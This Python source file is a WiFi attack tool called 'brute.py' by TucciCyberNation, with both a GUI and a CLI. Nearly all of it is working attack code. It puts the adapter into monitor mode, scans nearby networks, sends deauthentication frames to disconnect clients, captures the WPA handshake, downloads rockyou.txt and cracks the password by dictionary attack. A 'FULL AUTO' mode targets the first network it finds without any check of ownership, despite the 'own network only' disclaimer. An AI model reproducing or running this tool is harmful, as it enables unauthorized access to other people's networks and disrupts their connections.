#!/usr/bin/env python3
# ============================================================
#  brute.py v2.3  -  WiFi Security Testing Suite (GUI + CLI)
#  Created by TucciCyberNation
#
#  FOR EDUCATIONAL PURPOSES AND PERSONAL USE ONLY.
#  Use ONLY on your own WiFi network / systems you own or
#  have explicit written permission to test. Unauthorized
#  access to networks is illegal in most jurisdictions.
#
#  REQUIREMENTS: real Linux (Kali/Debian/Ubuntu), root,
#  a wireless adapter with monitor mode + injection.
#  Does NOT run in browser/WASM Python environments.
# ============================================================

import os
import sys
import time
import subprocess
import shutil
import threading
import re
import queue

try:
    import tkinter as tk
    from tkinter import scrolledtext, messagebox
    TK_OK = True
except ImportError:
    TK_OK = False

REQUIRED_PACKAGES = []  # tkinter ships with Python; nothing extra needed

TOOL_BANNER = r"""
  ____              _    _____
 |  _ \            | |  |_   _|
 | |_) | ___   ___ | | __ | |  _ __  _   _ _ __
 |  _ < / _ \ / _ \| |/ / | | | '_ \| | | | '_ \
 | |_) | (_) | (_) |   < _| |_| | | | |_| | |_) |
 |____/ \___/ \___/|_|\_\_____|_| |_|\__,_| .__/
                                          | |  by TucciCyberNation
                                          |_|  WiFi Security Suite v2.3
"""

DISCLAIMER_TEXT = (
    "FOR EDUCATIONAL PURPOSES AND PERSONAL USE ONLY.\n\n"
    "Use ONLY on your OWN WiFi network, or to recover passwords\n"
    "from networks you own or have explicit written permission\n"
    "to test. Unauthorized access to networks is ILLEGAL.\n"
    "TucciCyberNation is not responsible for misuse."
)


# ============================================================
#  PLATFORM CHECKS
# ============================================================
def check_platform():
    """Refuse to run on platforms that cannot spawn processes (e.g. WASM)."""
    if "emscripten" in sys.platform or "wasm" in sys.platform.lower():
        print("[!] FATAL: This environment is browser/WASM Python (emscripten).")
        print("    It cannot run subprocesses, WiFi tools, or GUI.")
        print("    Run this script on a real Linux machine:")
        print("        sudo python3 brute.py")
        sys.exit(1)
    if sys.platform == "win32":
        print("[!] FATAL: Windows is not supported. Use Kali/Debian/Ubuntu Linux.")
        print("    Recommended: Kali Linux (has aircrack-ng preinstalled).")
        sys.exit(1)


# ============================================================
#  SAFE SUBPROCESS WRAPPER (never crashes during cleanup)
# ============================================================
def run_cmd(cmd, **kwargs):
    """subprocess.run that returns None instead of raising on unsupported envs."""
    try:
        return subprocess.run(cmd, **kwargs)
    except (OSError, subprocess.SubprocessError):
        return None


# ============================================================
#  CORE ENGINE (shared by CLI and GUI)
# ============================================================
class WiFiEngine:
    def __init__(self, log=print):
        self.log = log
        self.stop_flag = threading.Event()

    def reset(self):
        self.stop_flag.clear()

    # --- Step 0: environment -------------------------------------------------
    def setup_environment(self):
        self.log("[*] Setting up Python environment...")
        run_cmd([sys.executable, "-m", "pip", "install", "--upgrade", "pip"],
                check=False, capture_output=True)
        self.log("[+] pip upgraded.")
        for pkg in REQUIRED_PACKAGES:
            run_cmd([sys.executable, "-m", "pip", "install", "--quiet", pkg],
                    check=False, capture_output=True)
        if os.geteuid() != 0:
            raise PermissionError("Must run as root (sudo).")
        self.log("[+] Running as root.")

        required = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
        missing = [t for t in required if shutil.which(t) is None]
        if missing:
            self.log(f"[*] Missing tools: {missing}. Installing aircrack-ng...")
            run_cmd(["apt-get", "update", "-y"], check=False, capture_output=True)
            r = run_cmd(["apt-get", "install", "-y", "aircrack-ng"],
                        check=False, capture_output=True)
            if r is None or r.returncode != 0:
                raise RuntimeError("Auto-install failed. Run: sudo apt install aircrack-ng")
        self.log("[+] All aircrack-ng tools ready.")

    # --- Step 1: monitor mode ------------------------------------------------
    @staticmethod
    def list_wireless_interfaces():
        ifaces = []
        try:
            out = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
            ifaces = re.findall(r"Interface\s+(\S+)", out)
        except (FileNotFoundError, OSError):
            try:
                with open("/proc/net/wireless") as f:
                    for line in f.readlines()[2:]:
                        name = line.split(":")[0].strip()
                        if name:
                            ifaces.append(name)
            except (FileNotFoundError, OSError):
                pass
        return ifaces

    def enable_monitor_mode(self, iface=None):
        ifaces = self.list_wireless_interfaces()
        if not ifaces:
            raise RuntimeError("No wireless interface detected.")
        iface = iface or ifaces[0]
        self.log(f"[*] Enabling monitor mode on {iface}...")
        run_cmd(["airmon-ng", "check", "kill"], capture_output=True)
        run_cmd(["airmon-ng", "start", iface], capture_output=True)

        try:
            out = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        except (FileNotFoundError, OSError):
            raise RuntimeError("iw not available - cannot verify monitor mode.")
        all_ifaces = re.findall(r"Interface\s+(\S+)", out)
        for cand in (iface + "mon", iface):
            if cand in all_ifaces:
                info = subprocess.run(["iw", "dev", cand, "info"],
                                      capture_output=True, text=True).stdout
                if cand == iface and "monitor" not in info:
                    continue
                self.log(f"[+] Monitor mode active: {cand}")
                return cand
        for i in all_ifaces:
            if "mon" in i:
                self.log(f"[+] Monitor interface: {i}")
                return i
        raise RuntimeError("Failed to enable monitor mode.")

    # --- Step 2: scan networks -----------------------------------------------
    def scan_networks(self, mon_iface, duration=15):
        self.log(f"[*] Scanning on {mon_iface} for {duration}s...")
        cap_file = f"/tmp/scan_{int(time.time())}"
        proc = subprocess.Popen(
            ["airodump-ng", mon_iface, "-w", cap_file, "--output-format", "csv"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(duration * 4):
            if self.stop_flag.is_set():
                break
            time.sleep(0.25)
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        time.sleep(2)

        networks = []
        csv_file = cap_file + "-01.csv"
        try:
            with open(csv_file, errors="replace") as f:
                in_ap = False
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    if "Station MAC" in line:
                        break
                    if "BSSID" in line:
                        in_ap = True
                        continue
                    if in_ap:
                        parts = [p.strip() for p in line.split(",")]
                        # airodump CSV AP row: BSSID, FirstSeen, Power, #Beacons,
                        # #IV, LAN-IP, ID-length, ESSID, Key, Rates, ...
                        if len(parts) > 13 and parts[0]:
                            bssid = parts[0]
                            power = parts[2]
                            channel = parts[3]
                            id_len = parts[6]
                            essid = parts[13]
                            try:
                                if int(id_len) != len(essid):
                                    essid = essid[:max(0, int(id_len))]
                            except ValueError:
                                pass
                            if essid:
                                networks.append({"bssid": bssid,
                                                 "channel": channel,
                                                 "essid": essid,
                                                 "power": power})
        except FileNotFoundError:
            raise RuntimeError("Scan failed - no CSV output.")

        seen = set()
        uniq = []
        for n in networks:
            if n["bssid"] not in seen:
                seen.add(n["bssid"])
                uniq.append(n)
        self.log(f"[+] Found {len(uniq)} networks.")
        return uniq

    # --- Step 3: capture handshake -------------------------------------------
    @staticmethod
    def handshake_path(target):
        essid = re.sub(r"\s+", "_", target["essid"])
        return f"/tmp/handshake_{essid}-01.cap"

    def capture_handshake(self, mon_iface, target, timeout=60):
        bssid, channel = target["bssid"], target["channel"]
        prefix = self.handshake_path(target).rsplit("-01.cap", 1)[0]
        cap_file = prefix + "-01.cap"
        # remove stale captures so old handshakes aren't misdetected
        for suffix in ("-01.cap", "-01.csv", "-01.kismet.csv", "-01.log.csv"):
            try:
                os.remove(prefix + suffix)
            except FileNotFoundError:
                pass

        self.log("[*] Starting handshake capture...")
        dump = subprocess.Popen(
            ["airodump-ng", mon_iface, "-c", channel, "--bssid", bssid, "-w", prefix],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        deauth = None
        try:
            deadline = time.time() + timeout
            sent_deauth = False
            while time.time() < deadline:
                if self.stop_flag.is_set():
                    return None
                time.sleep(3)
                if not os.path.exists(cap_file):
                    continue
                r = run_cmd(["aircrack-ng", "-w", os.devnull, cap_file],
                            capture_output=True, text=True)
                if r and "1 handshake" in r.stdout:
                    self.log("[+] HANDSHAKE CAPTURED!")
                    return cap_file
                if not sent_deauth and time.time() > deadline - 40:
                    self.log("[*] Sending deauth burst to force reconnect...")
                    deauth = subprocess.Popen(
                        ["aireplay-ng", "--deauth", "4", "-a", bssid, mon_iface],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    sent_deauth = True
            self.log("[!] No handshake captured within timeout.")
            return None
        finally:
            dump.terminate()
            try:
                dump.wait(timeout=5)
            except subprocess.TimeoutExpired:
                dump.kill()
            if deauth:
                deauth.terminate()
                try:
                    deauth.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    deauth.kill()
            time.sleep(2)

    # --- Step 4: crack ---------------------------------------------------------
    def crack_handshake(self, cap_file, wordlist, target):
        if not os.path.exists(cap_file):
            raise RuntimeError(f"Capture file not found: {cap_file}")
        if not os.path.exists(wordlist):
            self.log("[*] Wordlist missing. Downloading rockyou.txt...")
            try:
                subprocess.run(
                    [sys.executable, "-c",
                     "import urllib.request; urllib.request.urlretrieve("
                     "'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt',"
                     "'/tmp/rockyou.txt')"],
                    check=True)
                wordlist = "/tmp/rockyou.txt"
                self.log("[+] rockyou.txt downloaded.")
            except Exception as e:
                raise RuntimeError(f"Wordlist download failed: {e}")

        self.log(f"[*] Dictionary attack with {wordlist} ...")
        proc = subprocess.Popen(
            ["aircrack-ng", "-w", wordlist, "-b", target["bssid"], cap_file],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        tail = []
        for line in proc.stdout:
            tail.append(line)
            if len(tail) > 20:
                tail.pop(0)
            if self.stop_flag.is_set():
                proc.terminate()
                self.log("[!] Crack stopped by user.")
                return None
        proc.wait()
        output = "".join(tail)
        m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output)
        if m:
            self.log(f"[!!!] PASSWORD FOUND: {m.group(1)}")
            return m.group(1)
        self.log("[!] Password not in this wordlist.")
        return None

    # --- cleanup ---------------------------------------------------------------
    @staticmethod
    def cleanup(mon_iface=None):
        if mon_iface:
            run_cmd(["airmon-ng", "stop", mon_iface], capture_output=True)
        run_cmd(["service", "NetworkManager", "restart"], capture_output=True)


# ============================================================
#  INTERFACE MODE SELECTION
# ============================================================
def choose_mode():
    print(TOOL_BANNER)
    print("  1) CLI mode  (terminal)")
    print("  2) GUI mode  (graphical window)")
    try:
        choice = input("\nSelect mode [1/2, default 1]: ").strip()
    except (KeyboardInterrupt, EOFError):
        sys.exit(0)
    if choice == "2":
        return "gui"
    return "cli"


# ============================================================
#  CLI IMPLEMENTATION
# ============================================================
def run_cli():
    print(TOOL_BANNER)
    print("=" * 60)
    print(" DISCLAIMER")
    print("=" * 60)
    print(DISCLAIMER_TEXT)
    print("=" * 60)
    try:
        if input("\nAgree and continue? (yes/no): ").strip().lower() not in ("yes", "y"):
            print("Exiting. Stay legal.")
            return
    except (KeyboardInterrupt, EOFError):
        return

    engine = WiFiEngine()
    mon = None
    try:
        print("\n[*] STEP 0: Environment")
        engine.setup_environment()

        print("\n[*] STEP 1: Monitor mode")
        ifaces = engine.list_wireless_interfaces()
        print(f"[*] Interfaces: {ifaces}")
        if not ifaces:
            print("[!] No wireless interface found.")
            return
        pick = input(f"Interface (default {ifaces[0]}): ").strip() or None
        mon = engine.enable_monitor_mode(pick)

        print("\n[*] STEP 2: Scan & target selection")
        nets = engine.scan_networks(mon)
        if not nets:
            print("[!] No networks found.")
            return
        for i, n in enumerate(nets, 1):
            print(f"  [{i}] {n['essid']:<25} {n['bssid']}  CH:{n['channel']}  PWR:{n['power']}")
        c = input("\nTarget number: ").strip()
        target = nets[int(c) - 1]
        print(f"[+] Target: {target['essid']} ({target['bssid']})")

        print("\n[*] STEP 3: Handshake capture")
        cap = engine.capture_handshake(mon, target)
        if not cap:
            print("[!] No handshake. Exiting.")
            return

        print("\n[*] STEP 4: Cracking")
        wl = input("Wordlist path (default /tmp/rockyou.txt): ").strip() or "/tmp/rockyou.txt"
        pwd = engine.crack_handshake(cap, wl, target)

        if pwd:
            print(f"\n[+] Your WiFi password is: {pwd}")
        else:
            print("\n[-] Network resisted this wordlist (good sign).")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        engine.cleanup(mon)
        print("[*] Cleanup done.")


# ============================================================
#  GUI IMPLEMENTATION (tkinter)
# ============================================================
def run_gui():
    BG     = "#0d1117"
    PANEL  = "#161b22"
    LOG_BG = "#010409"
    FG     = "#c9d1d9"
    ACCENT = "#58a6ff"
    GREEN  = "#7ee787"

    root = tk.Tk()
    root.title("TucciCyberNation WiFi Security Suite v2.3")
    root.geometry("880x680")
    root.configure(bg=BG)

    # ---- disclaimer dialog ----
    agreed = {"ok": False}

    dlg = tk.Toplevel(root)
    dlg.title("Disclaimer")
    dlg.geometry("520x340")
    dlg.grab_set()
    tk.Label(dlg, text="DISCLAIMER - READ CAREFULLY",
             font=("Arial", 13, "bold"), fg="red").pack(pady=10)
    txt = tk.Text(dlg, wrap="word", height=10, width=60)
    txt.insert("1.0", DISCLAIMER_TEXT)
    txt.configure(state="disabled")
    txt.pack(padx=15, pady=5)
    dbtns = tk.Frame(dlg)
    dbtns.pack(pady=10)

    def agree():
        agreed["ok"] = True
        dlg.destroy()

    def decline():
        dlg.destroy()

    tk.Button(dbtns, text="I Agree & Continue", command=agree,
              bg="#238636", fg="white", width=18).pack(side="left", padx=5)
    tk.Button(dbtns, text="Decline & Exit", command=decline,
              bg="#da3633", fg="white", width=18).pack(side="left", padx=5)
    root.withdraw()
    dlg.protocol("WM_DELETE_WINDOW", decline)
    root.wait_window(dlg)
    if not agreed["ok"]:
        root.destroy()
        return
    root.deiconify()

    engine = WiFiEngine(log=lambda m: log_text(m))
    state = {"mon": None, "nets": [], "target": None}

    # ---- header / inputs ----
    tk.Label(root, text="TucciCyberNation WiFi Security Suite v2.3",
             font=("Arial", 14, "bold"), bg=BG, fg=ACCENT).pack(pady=8)

    top = tk.Frame(root, bg=BG)
    top.pack(fill="x", padx=10)

    tk.Label(top, text="Interface:", bg=BG, fg=FG).grid(row=0, column=0, sticky="w")
    iface_var = tk.StringVar()
    tk.Entry(top, textvariable=iface_var, width=14, bg=PANEL,
             fg="white", insertbackground="white").grid(row=0, column=1, padx=5)

    tk.Label(top, text="Wordlist:", bg=BG, fg=FG).grid(row=0, column=2, sticky="w", padx=(10, 0))
    wl_var = tk.StringVar(value="/tmp/rockyou.txt")
    tk.Entry(top, textvariable=wl_var, width=28, bg=PANEL,
             fg="white", insertbackground="white").grid(row=0, column=3, padx=5)

    tk.Label(top, text="Scan(s):", bg=BG, fg=FG).grid(row=1, column=0, sticky="w")
    scan_var = tk.StringVar(value="15")
    tk.Entry(top, textvariable=scan_var, width=6, bg=PANEL,
             fg="white", insertbackground="white").grid(row=1, column=1, sticky="w", padx=5)

    tk.Label(top, text="HS Timeout(s):", bg=BG, fg=FG).grid(row=1, column=2, sticky="w")
    hst_var = tk.StringVar(value="60")
    tk.Entry(top, textvariable=hst_var, width=6, bg=PANEL,
             fg="white", insertbackground="white").grid(row=1, column=3, sticky="w", padx=5)

    # ---- buttons ----
    btns = tk.Frame(root, bg=BG)
    btns.pack(fill="x", padx=10, pady=6)

    def btn(text, cmd, color):
        return tk.Button(btns, text=text, command=cmd, bg=color, fg="white",
                         relief="flat", padx=12, pady=5)

    # ---- network list ----
    nets_box = tk.Frame(root, bg=BG)
    nets_box.pack(fill="both", padx=10)
    tk.Label(nets_box, text="Discovered Networks:", bg=BG, fg=FG).pack(anchor="w")
    nets_list = tk.Listbox(nets_box, height=6, bg=PANEL, fg=FG,
                           selectbackground="#238636")
    nets_list.pack(fill="both", expand=True, pady=3)

    # ---- log console ----
    log_box = scrolledtext.ScrolledText(root, height=14, bg=LOG_BG,
                                        fg=GREEN, insertbackground="white",
                                        font=("Courier", 9))
    log_box.pack(fill="both", expand=True, padx=10, pady=8)

    status_var = tk.StringVar(value="Idle")
    tk.Label(root, textvariable=status_var, bg=BG, fg="#ffa657").pack(anchor="w", padx=10)

    # ---- thread-safe logging ----
    q = queue.Queue()

    def log_text(msg):
        q.put(msg)

    def poll_queue():
        try:
            while True:
                msg = q.get_nowait()
                log_box.insert("end", msg + "\n")
                log_box.see("end")
        except queue.Empty:
            pass
        root.after(100, poll_queue)
    poll_queue()

    busy = {"flag": False}

    def set_busy(b):
        busy["flag"] = b
        for w in btns.winfo_children():
            try:
                w.configure(state="disabled" if b else "normal")
            except tk.TclError:
                pass

    def in_thread(fn):
        if busy["flag"]:
            messagebox.showinfo("Busy", "A task is already running.")
            return
        engine.reset()
        set_busy(True)
        status_var.set("Working...")

        def wrapper():
            try:
                fn()
            except Exception as e:
                log_text(f"[!] Error: {e}")
            finally:
                set_busy(False)
                status_var.set("Idle")

        try:
            threading.Thread(target=wrapper, daemon=True).start()
        except RuntimeError:
            # threads unavailable (restricted env) - run inline to stay usable
            wrapper()

    def refresh_nets(nets, note=None):
        def do():
            nets_list.delete(0, "end")
            for n in nets:
                nets_list.insert("end",
                    f"{n['essid']:<25} {n['bssid']}  CH:{n['channel']}  PWR:{n['power']}")
            if note:
                status_var.set(note)
        root.after(0, do)

    # ---- GUI actions ----
    def do_env():
        def task():
            engine.setup_environment()
            ifaces = engine.list_wireless_interfaces()
            log_text(f"[*] Interfaces found: {ifaces}")
            if ifaces and not iface_var.get().strip():
                iface_var.set(ifaces[0])
        in_thread(task)

    def do_monitor():
        def task():
            state["mon"] = engine.enable_monitor_mode(iface_var.get().strip() or None)
        in_thread(task)

    def do_scan():
        def task():
            if not state["mon"]:
                log_text("[!] Enable monitor mode first.")
                return
            try:
                dur = int(scan_var.get() or 15)
            except ValueError:
                dur = 15
            nets = engine.scan_networks(state["mon"], dur)
            state["nets"] = nets
            refresh_nets(nets, f"{len(nets)} networks found.")
        in_thread(task)

    def do_handshake():
        def task():
            sel = nets_list.curselection()
            if not sel:
                log_text("[!] Select a network from the list first.")
                return
            if not state["mon"]:
                log_text("[!] Enable monitor mode first.")
                return
            t = state["nets"][sel[0]]
            state["target"] = t
            log_text(f"[+] Target: {t['essid']} ({t['bssid']})")
            try:
                hst = int(hst_var.get() or 60)
            except ValueError:
                hst = 60
            cap = engine.capture_handshake(state["mon"], t, hst)
            if cap:
                log_text("[+] Ready to crack. Press 'Crack'.")
            else:
                log_text("[!] No handshake captured.")
        in_thread(task)

    def do_crack():
        def task():
            t = state.get("target")
            if not t:
                sel = nets_list.curselection()
                if not sel:
                    log_text("[!] No target selected.")
                    return
                t = state["nets"][sel[0]]
                state["target"] = t
            cap = engine.handshake_path(t)
            if not os.path.exists(cap):
                log_text("[!] No handshake file. Capture first.")
                return
            engine.crack_handshake(cap, wl_var.get().strip(), t)
        in_thread(task)

    def do_full_auto():
        def task():
            log_text("[*] FULL AUTO MODE ENGAGED")
            engine.setup_environment()
            state["mon"] = engine.enable_monitor_mode(iface_var.get().strip() or None)
            try:
                dur = int(scan_var.get() or 15)
            except ValueError:
                dur = 15
            nets = engine.scan_networks(state["mon"], dur)
            if not nets:
                log_text("[!] No networks found.")
                return
            state["nets"] = nets
            refresh_nets(nets)
            state["target"] = nets[0]
            log_text(f"[*] Auto-target: {nets[0]['essid']}")
            try:
                hst = int(hst_var.get() or 60)
            except ValueError:
                hst = 60
            cap = engine.capture_handshake(state["mon"], nets[0], hst)
            if cap:
                engine.crack_handshake(cap, wl_var.get().strip(), nets[0])
            else:
                log_text("[!] Full-auto stopped: no handshake.")
        in_thread(task)

    def do_cleanup():
        def task():
            engine.cleanup(state["mon"])
            state["mon"] = None
            log_text("[*] Cleanup done - NetworkManager restored.")
        in_thread(task)

    def do_stop():
        engine.stop_flag.set()
        log_text("[!] Stop requested...")

    btn("1. Setup Env", do_env, "#1f6feb").pack(side="left", padx=3)
    btn("2. Monitor Mode", do_monitor, "#8957e5").pack(side="left", padx=3)
    btn("3. Scan", do_scan, "#238636").pack(side="left", padx=3)
    btn("4. Capture HS", do_handshake, "#d29922").pack(side="left", padx=3)
    btn("5. Crack", do_crack, "#da3633").pack(side="left", padx=3)
    btn("FULL AUTO", do_full_auto, "#f0883e").pack(side="left", padx=3)
    btn("Stop", do_stop, "#6e7681").pack(side="left", padx=3)
    btn("Cleanup", do_cleanup, "#30363d").pack(side="right", padx=3)

    def on_close():
        engine.stop_flag.set()
        try:
            engine.cleanup(state.get("mon"))
        except Exception:
            pass
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_close)
    log_text("[*] GUI ready. Start with 'Setup Env' or use FULL AUTO.")
    root.mainloop()


# ============================================================
#  MAIN
# ============================================================
if __name__ == "__main__":
    # optional CLI arg:  sudo python3 brute.py --cli  |  --gui
    if "--gui" in sys.argv:
        mode = "gui"
    elif "--cli" in sys.argv:
        mode = "cli"
    else:
        check_platform()
        mode = choose_mode()

    if mode == "gui":
        if not TK_OK:
            print("[!] tkinter not available - install python3-tk, falling back to CLI.")
            run_cli()
        else:
            try:
                run_gui()
            except tk.TclError as e:
                print(f"[!] GUI failed to start ({e}). No display available?")
                print("    Use CLI mode instead:  sudo python3 brute.py --cli")
                sys.exit(1)
    else:
        try:
            run_cli()
        except KeyboardInterrupt:
            print("\n[!] Interrupted.")
            sys.exit(0)
